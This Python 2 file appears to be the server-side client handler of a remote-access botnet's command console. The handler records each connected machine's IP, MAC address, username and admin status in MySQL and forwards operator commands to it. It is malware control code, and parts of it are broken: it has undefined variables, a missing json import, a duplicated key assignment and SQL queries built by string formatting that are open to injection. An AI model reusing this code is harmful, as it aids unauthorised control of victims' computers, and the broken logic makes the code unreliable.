#!/usr/bin/python

import os
import sys
import time
import socket
import colorama
import threading
import Crypto.Util
import Crypto.Hash
import Crypto.Random
import Crypto.PublicKey
import mysql.connector


class Client(threading.Thread):

    _prompt = None

    def __init__(self, connection, **kwargs):
        super(Client, self).__init__()
        self.connection     = connection
        self.shell          = threading.Event()
        self.lock           = threading.Lock()
        self.name           = kwargs.get('name')
        self.address        = kwargs.get('address')
        self.public_key     = kwargs.get('public_key')
        self.public_key     = kwargs.get('private_key')
        self.session_key    = self._session_key()
        self.info           = self._info()
        self.session        = self._session()
        self.connection.setblocking(True)
        assert isinstance(self.name, int)
        assert isinstance(self.address, str)
        assert isinstance(self.connection, socket.socket)
        assert isinstance(v, Crypto.PublicKey.RSA.RsaKey)
        assert isinstance(v, Crypto.PublicKey.RSA.RsaKey)


    def _kill(self):
        self.shell.clear()
        self.server.remove_client(self.name)
        self.server.current_client = None
        self.server.shell.set()
        self.server.run()

    def _info(self):
        buf  = ''
        while '\n' not in buf:
            buf += self.connection.recv(1024)
        text  = self.server._decrypt(buf.rstrip(), self.session_key)
        data  = json.loads(text.rstrip())
        if data.get('id'):
            client = data.get('id')
            select = self.server.database_query("select * from tbl_clients where id='{}'".format(client), display=False)
            if select:
                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self.name))
                _ = self.server.database_query('UPDATE tbl_clients SET %s' % ("{}='{}'".format(attr,data[attr]) for attr in ['id','public_ip','local_ip',  'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture']), display=False)
            else:
                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self.name))
                self.server.display(json.dumps(data))
                values = map(data.get, ['id', 'public_ip', 'local_ip', 'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture'])
                try:
                    self.server.database_procedure('sp_addClient', values)
                except mysql.connector.InterfaceError:
                    pass
        return data
            
    def _session_key(self):
        try:
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            g  = 2
            Ax = pow(g, a, p)  
            self.connection.send(Crypto.Util.number.long_to_bytes(Ax))
            Bx = Crypto.Util.number.bytes_to_long(self.connection.recv(256))
            k  = pow(Bx, a, p) 
            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(k)).hexdigest()
        except Exception as e:
            self._error("{} returned error: {}".format(self._session_key, str(e)))
            self._kill()

    def _session(self):
        try:
            session_id  = Crypto.Hash.MD5.new(json.dumps(self.info.get('id')) + str(int(time.time()))).hexdigest()
            ciphertext  = self.server._encrypt(session_id, self.session_key)
            self.connection.sendall(ciphertext + '\n')
            values      = [session_id, self.info.get('id'), self.session_key, self.public_key.exportKey(), self.private_key.exportKey()]
            cursor      = self.server.database.cursor(named_tuple=True)
            try:
                cursor.callproc('sp_addSession', values)
            except mysql.connector.InterfaceError:
                pass
            ciphertext  = ""
            while "\n" not in ciphertext:
                ciphertext += self.connection.recv(1024)
            plaintext   = self.server._decrypt(ciphertext.rstrip(), self.session_key)
            request     = json.loads(plaintext)
            if request.get('request') == 'public_key':
                response = self.server._encrypt(self.public_key.exportKey(), self.session_key)
                self.connection.sendall(response + '\n')
            return session_id
        except Exception as e2:
            self._error(str(e2))

    def _error(self, data):
        with self.lock:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')

    def prompt(self, data):
        with self.lock:
            return raw_input(self.server._prompt_color + self.server._prompt_style + '\n' + bytes(data).rstrip())

    def run(self):
        while True:
            try:
                self.shell.wait()    
                task = self.server.recv_client(self.name) if not self._prompt else self._prompt

                if 'help' in task.get('command'):
                    self.shell.clear()
                    self.server.show_usage_help(task.get('result'))
                    self.shell.set()

                elif 'passive' in task.get('command'):
                    self.server._print(task.get('result'))
                    break

                elif 'prompt' in task.get('command'):
                    self._prompt = task
                    command = self.prompt(task.get('result') % int(self.name))
                    cmd, _, action  = command.partition(' ')
                    if cmd in ('\n', ' ', ''):
                        continue 
                    elif cmd in self.server.commands and cmd != 'help':
                        result = self.server.commands[cmd](action) if len(action) else self.server.commands[cmd]()
                        if result:
                            self.server._print(result)
                            self.server.save_task_results(task)
                        continue
                    else:
                        self.server.send_client(command, self.name)
                        
                else:
                    if task.get('result') and task.get('result') != 'None':
                        self.server._print(task.get('result'))
                        self.server.save_task_results(task)
                        
                if self.server.exit_status:
                    break
                
                self.prompt = None
                
            except Exception as e:
                self._error(str(e))
                time.sleep(1)
                break
        self.server._return()
